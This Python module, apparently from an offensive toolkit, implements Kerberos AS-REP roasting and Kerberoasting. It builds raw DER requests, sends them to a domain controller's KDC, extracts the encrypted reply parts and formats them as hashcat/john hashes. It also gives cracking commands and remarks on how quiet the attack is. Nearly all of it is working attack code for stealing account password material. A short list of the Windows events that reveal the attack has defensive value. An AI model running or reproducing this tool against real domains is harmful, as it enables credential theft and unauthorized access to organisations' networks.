# ============================================================================
# FILE: core/kerberos.py
# ============================================================================
"""Kerberos roasting: ask the KDC for material that can be cracked offline.

Two attacks, one shape: the KDC hands out something encrypted with a key derived from the
account's password, and the cracking happens on the operator's own hardware with no further
traffic to the target.

* **AS-REP roasting**: an account with preauthentication disabled answers an AS-REQ with a
  blob encrypted under its own key. No credentials are needed to ask - the account name is
  enough, and `core.ldap.filters.asrep_roastable()` is where the names come from.
* **Kerberoasting**: any account with an SPN can be asked for a service ticket, and the ticket's
  encrypted part is protected by that service account's key. A normal domain user can request
  it, which is why it is the quiet one: nothing fails, nothing locks, and the request looks like
  a service being used.

The request builders and the response parsers are here (RFC 4120 DER), and the hash output is in
the format hashcat and john take directly.

Honest limits, because the operator is spending real cracking time:
  * RC4 (etype 23) is what is practical: AES (17/18) needs the salt, which is the realm and the
    account name for a user, but a service account's salt can differ
  * AS-REP roasting needs preauth to be OFF (a misconfiguration, not a default)
  * a service ticket with etype 23 is a downgrade, and a modern DC may refuse to issue it
  * the cracked password is only as good as the wordlist, and the account may be a service
    account with a 40-character random password - which is why this is worth trying and not
    worth assuming
"""
import os
import socket
import time

__all__ = ["KerberosError", "as_req", "tgs_req", "parse_reply", "asrep_hash", "tgs_hash",
           "roast", "plan", "describe", "KDC_PORTS", "ETYPES"]

KDC_PORTS = {"udp": 88, "tcp": 88}

# The encryption types worth naming, with what they mean for cracking.
ETYPES = {
    23: ("rc4-hmac", "RC4-HMAC-MD5: crackable with hashcat mode 18200/13100, no salt needed"),
    17: ("aes128-cts-hmac-sha1-96", "AES128: needs the salt (realm + account for a user)"),
    18: ("aes256-cts-hmac-sha1-96", "AES256: needs the salt; hashcat mode 19700/19600"),
    3: ("des-cbc-md5", "DES: legacy, rarely issued"),
}

# RFC 4120 application tags.
_TAG_AS_REQ, _TAG_AS_REP = 10, 11
_TAG_TGS_REQ, _TAG_TGS_REP = 12, 13
_TAG_ERROR = 30


class KerberosError(RuntimeError):
    """A refusal the CLI can report verbatim."""


# ------------------------------------------------------------------ DER --
def _len(n):
    if n < 0x80:
        return bytes([n])
    body = b""
    while n:
        body = bytes([n & 0xFF]) + body
        n >>= 8
    return bytes([0x80 | len(body)]) + body


def _tlv(tag, body):
    return bytes([tag]) + _len(len(body)) + body


def _int(value, tag=0x02):
    if value == 0:
        return _tlv(tag, b"\x00")
    body, n = b"", int(value)
    while n:
        body = bytes([n & 0xFF]) + body
        n >>= 8
    if body[0] & 0x80:
        body = b"\x00" + body
    return _tlv(tag, body)


def _octet(value):
    return _tlv(0x04, value if isinstance(value, bytes) else str(value).encode())


def _general_string(value):
    return _tlv(0x1B, str(value).encode("utf-8"))


def _generalized_time(when=None):
    text = time.strftime("%Y%m%d%H%M%SZ", time.gmtime(when or time.time()))
    return _tlv(0x18, text.encode())


def _sequence(*parts):
    return _tlv(0x30, b"".join(parts))


def _context(tag, *parts, constructed=True):
    body = b"".join(parts)
    return _tlv(0xA0 | tag if constructed else 0x80 | tag, body)


def _principal(realm, name, name_type=1):
    """PrincipalName + realm, the pair every request carries.

    A Kerberos name is a SEQUENCE of components, not one string: an SPN like
    `MSSQLSvc/sql.contoso.test:1433` is TWO components, and sending it as one is a request the
    KDC answers with an error nobody can read.
    """
    components = [c for c in str(name).split("/") if c] or [str(name)]
    return _sequence(
        _context(0, _int(name_type)),
        _context(1, _sequence(*[_general_string(c) for c in components])),
    ), _general_string(realm)


def _bit_string(value, unused_bits=0):
    """A DER BIT STRING. The first content octet is the UNUSED BIT COUNT, and omitting it
    (which the first version did) makes the KDCOptions field invalid - a real KDC refuses the
    request, and impacket's encoder emits `03 06 00 40 00 00 00 00` for the same flags."""
    body = bytes([unused_bits]) + value
    return _tlv(0x03, body)


def _kdc_req_body(realm, cname, sname, etypes=(23, 18, 17), till=None, nonce=None,
                  kdc_options=None):
    """KDC-REQ-BODY with the context tags RFC 4120 actually specifies.

    Ground truth (impacket's KDC_REQ_BODY, verified by encoding it): kdc-options [0], cname [1],
    realm [2], sname [3], till [5], rtime [6], nonce [7], etype [8]. The first version emitted
    cname/realm/sname as BARE SEQUENCE/GeneralString and numbered till/nonce/etype from [2],
    which a real KDC rejects - the module could not talk to one in either direction.
    """
    options = 0x40810010 if kdc_options is None else kdc_options
    return _sequence(
        _context(0, _bit_string(options.to_bytes(5, "big"))),
        _context(1, cname[0]),                       # cname
        _context(2, cname[1]),                       # realm
        _context(3, sname[0]),                       # sname
        _context(5, _generalized_time(till or time.time() + 86400)),   # till
        _context(7, _int(nonce or int.from_bytes(os.urandom(4), "big"))),  # nonce
        _context(8, _sequence(*[_int(e) for e in etypes])),            # etype
    )


def as_req(realm, user, etypes=(23, 18, 17), preauth=False, till=None, nonce=None,
           kdc_options=None, pac_request=True):
    """An AS-REQ. With `preauth=False` this is the AS-REP-roasting request: no credentials.

    The reply for a preauth-disabled account carries a blob encrypted under the account's key,
    which is the whole point. For an account WITH preauth, the KDC answers
    `KDC_ERR_PREAUTH_REQUIRED` and this is only a probe.
    """
    if not str(realm or "").strip():
        raise KerberosError("an AS-REQ needs a realm")
    if not str(user or "").strip():
        raise KerberosError("an AS-REQ needs a user")
    cname = _principal(realm, user)
    sname = _principal(realm, "krbtgt/" + realm, name_type=2)
    body = _kdc_req_body(realm, cname, sname, etypes=etypes, till=till, nonce=nonce,
                         kdc_options=kdc_options)
    padata = []
    if preauth:
        padata.append(_context(3, _sequence()))            # empty PA-DATA list placeholder
    fields = [_context(1, _int(5, tag=0x02)),           # pvno 5
              _context(2, _int(_TAG_AS_REQ, tag=0x02)),  # msg-type 10
              _context(4, body)]                         # req-body [4]
    if padata:
        fields.insert(2, _context(3, b"".join(padata)))  # padata [3] sits before req-body
    # AS-REQ ::= [APPLICATION 10] KDC-REQ: the application tag wraps the SEQUENCE, and a
    # request without it is not a request a KDC will look at
    return _tlv(0x60 | _TAG_AS_REQ, _sequence(*fields))


def tgs_req(realm, user, spn, tgt=b"", session_key=b"", etypes=(23, 18, 17), till=None,
            nonce=None, kdc_options=0x40810000):
    """A TGS-REQ for one SPN - the Kerberoasting request.

    A TGS-REQ needs a TGT in its AP-REQ padata. Without one (no credentials at hand) the request
    is built but the operator must supply the ticket: this builder is honest about that rather
    than emitting something a KDC will reject for a reason nobody can see.
    """
    if not str(spn or "").strip():
        raise KerberosError("a TGS-REQ needs an SPN")
    service, _, host = str(spn).partition("/")
    cname = _principal(realm, user)
    sname = _principal(realm, spn, name_type=2) if host else _principal(realm, service,
                                                                       name_type=2)
    body = _kdc_req_body(realm, cname, sname, etypes=etypes, till=till, nonce=nonce,
                         kdc_options=kdc_options)
    fields = [_context(1, _int(5, tag=0x02)),
              _context(2, _int(_TAG_TGS_REQ, tag=0x02))]
    if tgt:
        # AP-REQ padata: the ticket plus a fresh authenticator would go here; without a session
        # key we cannot sign one, so the ticket alone is attached and the caller is told
        fields.append(_context(3, _sequence(_context(1, _int(2, tag=0x02)),
                                           _context(2, _sequence(_octet(tgt))))))
    fields.append(_context(4, body))
    # TGS-REQ ::= [APPLICATION 12] KDC-REQ, same shape as the AS-REQ
    return _tlv(0x60 | _TAG_TGS_REQ, _sequence(*fields))


def parse_reply(data, tag=None):
    """Read a KDC reply: the cipher blob and what it is protected by.

    Returns {kind, etype, cipher, realm, principal, error, error_text, raw_enc}. `kind` is
    as_rep / tgs_rep / error / unknown.
    """
    if not data:
        raise KerberosError("nothing to parse")
    offset, out = 0, {"kind": "unknown", "etype": 0, "cipher": b"", "realm": "",
                      "principal": "", "error": 0, "error_text": ""}
    tag, fields, _end = _read(data, offset)
    # a real reply's OUTER tag is [APPLICATION 11] (AS-REP) or [APPLICATION 13] (TGS-REP),
    # symmetric with the request this module emits as [APPLICATION 10]; requiring a bare
    # SEQUENCE rejected every real reply (the tests only passed because their fixtures wrapped
    # one in an extra SEQUENCE)
    if (tag & 0xC0) == 0x40 and isinstance(fields, list):
        out["kind"] = {_TAG_AS_REP: "as_rep", _TAG_TGS_REP: "tgs_rep",
                       _TAG_ERROR: "error"}.get(tag & 0x1F, "unknown")
        _walk_reply(fields, out)
        return out
    if tag != 0x30 or not isinstance(fields, list):
        raise KerberosError(f"a KDC reply is [APPLICATION n], not tag {tag:#x}")
    for f_tag, f_value in fields:
        if (f_tag & 0xC0) == 0x40 and isinstance(f_value, list):
            app_tag = f_tag & 0x1F
            out["kind"] = {_TAG_AS_REP: "as_rep", _TAG_TGS_REP: "tgs_rep",
                           _TAG_ERROR: "error"}.get(app_tag, "unknown")
            _walk_reply(f_value, out)
            break
    return out


def _unwrap(value, *wanted):
    """The value inside an EXPLICIT context tag.

    impacket's ASN.1 module (and RFC 4120's own notation) uses EXPLICIT tagging: `crealm [3]` is
    0xA3 wrapping a GeneralString, `cipher [2]` is 0xA2 wrapping an OCTET STRING, and
    `enc-part [6]` is 0xA6 wrapping a SEQUENCE. Reading only the implicit form (which the first
    version did) extracts NOTHING from a real reply - no etype, no cipher, no hash.
    """
    if not isinstance(value, list):
        return value
    for child_tag, child in value:
        if child_tag in wanted:
            return child
    return value[0][1] if value else b""


def _walk_reply(fields, out):
    """Read an AS-REP / TGS-REP / KRB-ERROR body (RFC 4120, explicit tags).

    The tags, verified against impacket: crealm [3], cname [4], ticket [5], enc-part [6] on a
    reply; and error-code [6], crealm [7], cname [8], e-text [9] on a KRB-ERROR. The same tag
    number 6 carries an INTEGER on an error and a SEQUENCE on a reply, which is the only thing
    that tells them apart.
    """
    for tag, value in fields or []:
        if tag == 0xA3:                                              # crealm [3]
            realm = _unwrap(value, 0x1B, 0x04)
            if isinstance(realm, bytes):
                out["realm"] = realm.decode("utf-8", "replace")
        elif tag == 0xA4:                                            # cname [4]
            inner = _unwrap(value, 0x30)
            out["principal"] = _principal_name(inner if isinstance(inner, list) else value) \
                or out["principal"]
        elif tag == 0xA6:                                            # enc-part [6] / error-code
            inner = _unwrap(value, 0x30)
            if isinstance(inner, list):
                for sub_tag, sub in inner:
                    if sub_tag == 0xA0:                              # etype [0]
                        out["etype"] = _as_int(_unwrap(sub, 0x02))
                    elif sub_tag == 0xA2:                            # cipher [2]
                        cipher = _unwrap(sub, 0x04)
                        if isinstance(cipher, bytes):
                            out["cipher"] = cipher
                    elif sub_tag == 0x02 and not out["etype"]:
                        out["etype"] = _as_int(sub)
                    elif sub_tag in (0x04, 0x82) and isinstance(sub, bytes) \
                            and not out["cipher"]:
                        out["cipher"] = sub
            else:
                code = _as_int(_unwrap(value, 0x02))
                if code and not out["cipher"]:
                    out["error"] = code
        elif tag == 0xA7:                                            # crealm [7] on KRB-ERROR
            realm = _unwrap(value, 0x1B, 0x04)
            if isinstance(realm, bytes) and not out["realm"]:
                out["realm"] = realm.decode("utf-8", "replace")
        elif tag == 0xA9:                                            # e-text [9] on KRB-ERROR
            text = _unwrap(value, 0x1B, 0x04)
            if isinstance(text, bytes):
                out["error_text"] = text.decode("utf-8", "replace")
        elif tag in (0x82, 0x04) and isinstance(value, bytes) and not out["realm"]:
            out["realm"] = value.decode("utf-8", "replace")           # tolerant: implicit form
        elif tag == 0x86:
            out["error"] = _as_int(value)
        elif tag == 0x89 and isinstance(value, bytes):
            out["error_text"] = value.decode("utf-8", "replace")
    return out


def _as_int(value):
    """An INTEGER that arrived as a context-primitive (the tag hides the type, so the bytes
    have to be read as a big-endian integer)."""
    if isinstance(value, int):
        return value
    if isinstance(value, (bytes, bytearray)) and value:
        return int.from_bytes(bytes(value), "big")
    return 0


def _principal_name(fields):
    """The account name out of a PrincipalName: [0] name-type, [1] name-string SEQUENCE."""
    for tag, value in fields or []:
        if tag == 0xA1 and isinstance(value, list):
            for sub_tag, sub in value:
                if sub_tag == 0x30 and isinstance(sub, list):
                    for name_tag, name in sub:
                        if name_tag == 0x1B and isinstance(name, bytes):
                            return name.decode("utf-8", "replace")
    return ""


def _read(buf, offset=0):
    """A tiny DER reader (the Kerberos module cannot import core.ldap's, which is LDAP-shaped)."""
    if offset >= len(buf):
        raise KerberosError("read past the end")
    tag = buf[offset]
    i = offset + 1
    first = buf[i]
    i += 1
    if first < 0x80:
        length = first
    else:
        count = first & 0x7F
        length = int.from_bytes(buf[i:i + count], "big")
        i += count
    end = i + length
    if end > len(buf):
        raise KerberosError("element longer than the buffer")
    body = buf[i:end]
    if tag & 0x20:
        children, j = [], 0
        while j < len(body):
            _t, _v, j = _read(body, j)
            children.append((_t, _v))
        return tag, children, end
    if tag in (0x02, 0x0A, 0x03):
        return tag, int.from_bytes(body, "big", signed=bool(body and body[0] & 0x80)), end
    return tag, body, end


# ------------------------------------------------------------- hashes --
def asrep_hash(user, realm, cipher, etype=23, checksum=b""):
    """The hashcat line for an AS-REP blob.

    `$krb5asrep$<etype>$<user>@<REALM>:<first 16 bytes as the checksum>$<rest>` - the split is
    what hashcat mode 18200 expects, and getting it wrong produces a hash that never cracks.
    """
    if not cipher:
        raise KerberosError("no encrypted part: the AS-REP roasting request did not succeed")
    if etype == 23:
        blob = bytes(cipher)
        if not checksum:
            checksum, blob = blob[:16], blob[16:]
        return (f"$krb5asrep${etype}${user}@{realm}:"
                f"{checksum.hex()}${blob.hex()}")
    # AES: the checksum is the last 12 bytes, and the hash keeps the blob whole
    blob = bytes(cipher)
    if not checksum and len(blob) > 12:
        checksum, blob = blob[-12:], blob[:-12]
    return (f"$krb5asrep${etype}${user}@{realm}:"
            f"{checksum.hex()}${blob.hex()}")


def tgs_hash(user, realm, spn, cipher, etype=23, checksum=b""):
    """The hashcat line for a service ticket (mode 13100 for RC4, 19600/19700 for AES)."""
    if not cipher:
        raise KerberosError("no encrypted part: the service ticket was not issued")
    blob = bytes(cipher)
    if not checksum:
        if etype == 23:
            checksum, blob = blob[:16], blob[16:]
        elif len(blob) > 12:
            checksum, blob = blob[-12:], blob[:-12]
    return (f"$krb5tgs${etype}$*{user}${realm}${spn}*"
            f"${checksum.hex()}${blob.hex()}")


def roast(realm, user, spn="", transport=None, timeout=10, kdc="", etypes=(23, 18, 17)):
    """Send one request and return the reply (parsed) plus the crackable line when there is one.

    `transport(request_bytes) -> reply_bytes` is injectable: a test drives a canned reply, and a
    real run sends to the KDC over UDP with a TCP retry for a truncated answer.
    """
    if not str(realm or "").strip():
        raise KerberosError("roasting needs a realm")
    request = (tgs_req(realm, user, spn, etypes=etypes) if spn
               else as_req(realm, user, etypes=etypes, preauth=False))
    send = transport or _udp_transport(kdc or realm, timeout=timeout)
    reply = send(request)
    parsed = parse_reply(reply)
    out = {"request": "tgs" if spn else "as", "user": user, "realm": realm, "spn": spn,
           "reply": parsed, "hash": "", "etype": parsed.get("etype")}
    if parsed.get("kind") == "error":
        out["error"] = parsed.get("error") or 0
        out["error_text"] = parsed.get("error_text") or ""
        out["note"] = _error_note(parsed.get("error") or 0)
        return out
    if parsed.get("cipher"):
        out["hash"] = (tgs_hash(user, realm, spn, parsed["cipher"], etype=parsed["etype"] or 23)
                       if spn else asrep_hash(user, realm, parsed["cipher"],
                                              etype=parsed["etype"] or 23))
    return out


def _error_note(code):
    return {
        6: "KDC_ERR_C_PRINCIPAL_UNKNOWN: no such account (check the name, not the password)",
        12: "KDC_ERR_POLICY: the KDC refuses this request type",
        18: "KDC_ERR_CLIENT_REVOKED: the account is disabled or locked - STOP, do not retry",
        23: "KDC_ERR_PREAUTH_FAILED: preauthentication is required (this account is not "
            "AS-REP roastable)",
        24: "KDC_ERR_PREAUTH_REQUIRED: preauth is ON, so AS-REP roasting does not apply here",
        25: "KDC_ERR_SERVER_NOMATCH",
        29: "KRB_AP_ERR_TKT_NYV: the ticket is not yet valid (clock skew)",
        31: "KRB_AP_ERR_SKEW: clock skew - sync the clock and retry",
        32: "KRB_AP_ERR_BADADDR",
        34: "KRB_AP_ERR_BADVERSION",
        37: "KDC_ERR_ETYPE_NOSUPP: the KDC will not issue this encryption type (a downgrade "
            "refusal, which is what a hardened DC does)",
    }.get(code, f"KDC error {code}")


def _udp_transport(kdc, timeout=10, port=88):
    def send(request):
        host = str(kdc).split(":")[0]
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        try:
            sock.sendto(request, (host, port))
            data, _addr = sock.recvfrom(65535)
        except TimeoutError as e:
            raise KerberosError(f"no answer from the KDC at {host}:{port} "
                                "(a firewall, or the wrong realm)") from e
        finally:
            sock.close()
        return data
    return send


def plan(realm="", users=0, spns=0):
    return {
        "realm": realm, "users": users, "spns": spns,
        "what": ("ask the KDC for blobs encrypted under an account's key: an AS-REP for an "
                 "account without preauth, a service ticket for any account with an SPN"),
        "targets": ("core.ldap.filters.asrep_roastable() and kerberoastable() - the directory "
                    "decides who is worth asking"),
        "cracking": [
            "AS-REP (etype 23): hashcat -m 18200",
            "service ticket (etype 23): hashcat -m 13100",
            "AES128/256: -m 19600/19700, and the salt is realm + account for a user",
        ],
        "quiet": ("Kerberoasting needs no credentials beyond a domain user, fails nothing and "
                  "locks nothing - the request looks like a service being used. AS-REP roasting "
                  "is louder: one 4768 per account, with no preauth"),
        "visible": [
            "4768 with preauthentication type 0 (AS-REP roasting) for the same account",
            "4769 with encryption type 0x17 (RC4) for SPNs the caller never uses",
            "one 4769 per SPN in a burst - the enumeration is the pattern",
            "an etype-23 downgrade on a domain that has AES: the DC may refuse it, which is "
            "itself the control",
        ],
        "limits": [
            "preauth must be OFF for AS-REP roasting (a misconfiguration, not a default)",
            "a service account with a random 40-character password will not crack",
            "the DC may refuse etype 23 (KDC_ERR_ETYPE_NOSUPP) - then it is AES, and AES needs "
            "the salt",
        ],
    }


def describe(facts):
    if "hash" in (facts or {}):
        lines = [f"roast: {facts['request']} for {facts['user']}@{facts['realm']}"
                 + (f" (spn {facts['spn']})" if facts.get("spn") else "")]
        if facts.get("hash"):
            lines.append(f"  hash: {facts['hash'][:120]}...")
            lines.append(f"  crack: hashcat -m "
                         f"{'13100' if facts['request'] == 'tgs' else '18200'} <file> "
                         f"<wordlist>")
        else:
            lines.append(f"  no hash: {facts.get('note') or 'the reply carried no cipher'}")
        return "\n".join(lines)
    lines = [f"kerberos plan ({facts.get('realm') or 'no realm'})"]
    lines.append(f"  what: {facts.get('what')}")
    for item in facts.get("limits") or []:
        lines.append(f"  limit: {item}")
    return "\n".join(lines)
